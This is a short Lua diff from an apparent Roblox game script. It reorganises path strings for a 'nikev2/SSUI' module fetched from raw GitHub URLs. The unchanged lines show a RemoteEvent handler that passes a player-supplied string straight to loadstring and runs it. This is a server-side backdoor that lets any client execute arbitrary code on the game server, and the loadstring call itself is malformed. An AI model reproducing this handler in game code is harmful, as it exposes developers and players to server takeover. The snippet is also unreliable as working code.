@@ -1,7 +1,8 @@
 remote.OnServerEvent:Connect(function(player, getstuff)
-		local user = 'nikev2/'
-		local main = 'SSUI/'
-		local Modules = 'Modules/'
+	local paths = {
+		user = 'nikev2/',
+		main = 'SSUI/',
+		Modules = 'Modules/',}
 		
 		local raw = 'https://raw.githubusercontent.com/'
 		loadstring()(getstuff)()
